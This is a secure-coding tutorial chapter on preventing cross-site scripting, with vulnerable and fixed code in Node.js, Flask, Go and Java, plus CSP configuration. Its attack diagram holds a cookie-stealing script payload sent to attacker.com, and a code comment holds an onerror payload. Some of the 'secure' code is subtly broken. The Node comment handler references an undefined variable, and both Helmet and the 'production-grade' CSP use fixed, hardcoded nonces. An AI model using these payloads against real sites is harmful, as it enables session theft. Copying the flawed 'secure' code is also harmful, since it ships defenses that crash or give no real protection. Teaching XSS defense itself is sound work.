---
title: "Chapter 3: Output Encoding & XSS Prevention"
description: "Master context-aware output encoding, DOM-based XSS defense, DOMPurify rich text sanitization, and Content Security Policy (CSP) implementation."
keywords: ["AppSec", "XSS", "Cross-Site Scripting", "Output Encoding", "DOMPurify", "Content Security Policy", "Jinja2", "OWASP Java Encoder"]
---

# Chapter 3: Output Encoding & XSS Prevention

## Context-Aware Encoding Deep Mechanics

Cross-Site Scripting (XSS) occurs when untrusted data is included in a web page without proper encoding or sanitization, causing the browser to execute client-side scripts in the context of the user's session.

> [!WARNING]
> **Context Mismatch Vulnerability:** Applying standard HTML entity encoding (e.g., `&lt;` and `&gt;`) inside a JavaScript block (`<script>var data = "ENCODED_HERE";</script>`) **DOES NOT PREVENT XSS**. The JavaScript interpreter evaluates quotes and escape characters regardless of HTML entity encoding.

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant Server as Application Server
    participant Browser as User Browser
    participant CSP as CSP Policy Layer

    Attacker->>Server: HTTP GET /search?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
    alt Without Output Encoding
        Server->>Browser: 200 OK Raw HTML Response with Payload
        Browser->>Browser: HTML Parser encounters <script> tag -> Executes Script
        Browser->>Attacker: Exfiltrates Session Cookie
    else With Context-Aware Encoding & Strict CSP
        Server->>Browser: 200 OK Escaped HTML (&lt;script&gt;) + CSP Header
        Browser->>Browser: HTML Parser treats payload as Literal Text String
        CSP-->>Browser: Blocks un-trusted inline scripts / network connections
    end
```

---

## The 5 Encoding Contexts Matrix

| Context | Example Injection Point | Safe Encoding Method | Dangerous Characters to Neutralize |
| :--- | :--- | :--- | :--- |
| **1. HTML Body** | `<div>UNTRUSTED</div>` | HTML Entity Encoding | `&` `.` `<` `>` `"` `'` `/` |
| **2. HTML Attribute** | `<input value="UNTRUSTED">` | Hex Attribute Encoding (`&#xHH;`) | All non-alphanumeric characters |
| **3. JavaScript Variable** | `<script>var name = "UNTRUSTED";</script>` | Unicode Escaping (`\uXXXX`) / `JSON.stringify()` | Quotes `"`, `'`, `\`, control chars, `<`/`>` |
| **4. CSS Context** | `<style>body { color: UNTRUSTED; }</style>` | CSS Hex Escaping (`\HH `) | All non-alphanumeric characters |
| **5. URL Parameter** | `<a href="/profile?name=UNTRUSTED">` | Percent Encoding (`encodeURIComponent`) | Non-alphanumeric, `?`, `=`, `&`, `/` |

---

## XSS Classifications & Mutation XSS (mXSS)

* **Reflected XSS:** Payload resides in the immediate HTTP request (URL parameters, headers) and is reflected back in the immediate HTTP response.
* **Stored XSS:** Payload is permanently stored in a backend persistent store (database, log file, comment section) and served to victims later.
* **DOM-based XSS:** Payload is processed entirely on the client side by vulnerable JavaScript reading from a source (`location.search`, `document.referrer`) and writing to an executable sink (`innerHTML`, `eval()`, `document.write()`).
* **Mutation XSS (mXSS):** Occurs when the browser's HTML parser mutates raw HTML while rendering (e.g., innerHTML reassignment), turning benign-looking unsanitized HTML into executable JavaScript.

---

## Multi-Language Code Implementation

### 1. Node.js & Express

#### ❌ Vulnerable (Raw HTML Template Interpolation)
```javascript
// vulnerable_xss.js
app.get('/profile', (req, res) => {
    const name = req.query.name; 
    // Attacker payload: ?name=<img src=x onerror=alert(document.cookie)>
    res.send(`<h1>Welcome back, ${name}</h1>`); // Reflected XSS!
});
```

#### ✅ Secure (Context Encoding + Rich Text Sanitization + Helmet CSP)
```javascript
// secure_xss.js
const express = require('express');
const helmet = require('helmet');
const escapeHtml = require('escape-html');
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);
const app = express();

// 1. Configure Strict CSP Headers using Helmet
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-2726c7f26c'"], // Strict Nonce
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
    },
  })
);

// 2. Text Output Context Encoding
app.get('/profile', (req, res) => {
    const rawName = req.query.name || '';
    const safeName = escapeHtml(rawName); // Neutralizes HTML tags
    res.send(`<h1>Welcome back, ${safeName}</h1>`);
});

// 3. Rich Text HTML Sanitization (e.g., Blog Comment accepting safe formatting)
app.post('/comment', express.json(), (req, res) => {
    const rawHtmlComment = req.body.comment;
    // Strip dangerous script, iframe, and event handler tags
    const cleanHtml = DOMPurify.sanitize(rawHtmlHtmlComment, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
        ALLOWED_ATTR: ['href']
    });
    res.json({ status: "success", comment: cleanHtml });
});
```

---

### 2. Python (Flask / Jinja2 / nh3 Rich Text)

#### ❌ Vulnerable (Bypassing Auto-escaping with `| safe`)
```html
<!-- template_vuln.html -->
<div>
    <!-- The 'safe' filter disables Jinja2 auto-escaping completely! -->
    <p>User Bio: {{ user_bio | safe }}</p> 
</div>
```

#### ✅ Secure (Default Jinja2 Auto-escaping & Rust-backed `nh3` Sanitization)
```python
# secure_app.py
from flask import Flask, render_template_string, request
import nh3  # Fast, secure HTML sanitizer powered by Rust ammonia

app = Flask(__name__)

@app.route('/user')
def user_profile():
    bio = request.args.get('bio', '')
    
    # 1. For Plain Text Rendering: Depend on Jinja2 auto-escaping (Default)
    # 2. For Rich Text HTML Input: Sanitize using nh3 allowlist
    sanitized_bio = nh3.clean(
        bio,
        tags={"p", "b", "i", "a", "code"},
        attributes={"a": {"href"}}
    )
    
    template = """
    <h2>Profile Page</h2>
    <!-- Jinja auto-escapes standard variables -->
    <p>Username: {{ username }}</p>
    <!-- Explicitly sanitized HTML bio rendered -->
    <div>Bio: {{ bio | safe }}</div>
    """
    return render_template_string(template, username=request.args.get('name'), bio=sanitized_bio)
```

---

### 3. Go (html/template vs text/template)

> [!CAUTION]
> Go developers often accidentally import `text/template` instead of `html/template`. `text/template` DOES NOT encode HTML, leading directly to XSS!

#### ❌ Vulnerable (Using `text/template`)
```go
package main

import (
	"text/template" // ❌ VULNERABLE: Does not perform contextual escaping
	"net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
	tmpl := template.Must(template.New("page").Parse("<h1>Hello {{.}}</h1>"))
	tmpl.Execute(w, r.URL.Query().Get("name")) // Reflected XSS!
}
```

#### ✅ Secure (Using `html/template`)
```go
package main

import (
	"html/template" // ✅ SECURE: Context-aware escaping engine
	"net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
	// html/template automatically detects HTML context and encodes correctly
	tmpl := template.Must(template.New("page").Parse("<h1>Hello {{.}}</h1>"))
	tmpl.Execute(w, r.URL.Query().Get("name"))
}
```

---

### 4. Java (OWASP Java Encoder)

#### ❌ Vulnerable (Direct String Concatenation in Servlets/JSP)
```java
// VulnerableServlet.java
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String query = req.getParameter("q");
    resp.getWriter().write("<div>Search results for: " + query + "</div>"); // XSS
}
```

#### ✅ Secure (OWASP Java Encoder Library)
```java
// SecureServlet.java
import org.owasp.encoder.Encode;
import javax.servlet.http.*;
import java.io.IOException;

public class SecureServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String query = req.getParameter("q");
        
        // Context-specific encoding using OWASP Java Encoder
        String safeHtmlBody = Encode.forHtml(query);
        String safeAttribute = Encode.forHtmlAttribute(query);
        String safeJavaScript = Encode.forJavaScript(query);
        
        resp.setContentType("text/html;charset=UTF-8");
        resp.getWriter().write("<div title='" + safeAttribute + "'>" + safeHtmlBody + "</div>");
    }
}
```

---

## Content Security Policy (CSP) Engineering

A robust **Content Security Policy (CSP)** serves as a secondary defense layer to mitigate XSS if output encoding fails.

### Production-Grade Strict CSP Header
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m12345' 'strict-dynamic'; object-src 'none'; base-uri 'self'; require-trusted-types-for 'script'; frame-ancestors 'none';
```

### Nginx Server Hardening Snippet
```nginx
# /etc/nginx/conf.d/security_headers.conf
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'; object-src 'none'; frame-ancestors 'none';" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
```

---

> [!NOTE]
> **Key Takeaway:** Context is everything. Always use context-aware encoders (`html/template` in Go, `OWASP Encoder` in Java, Jinja default in Python) and lock down the browser runtime with strict Nonce-based CSP.
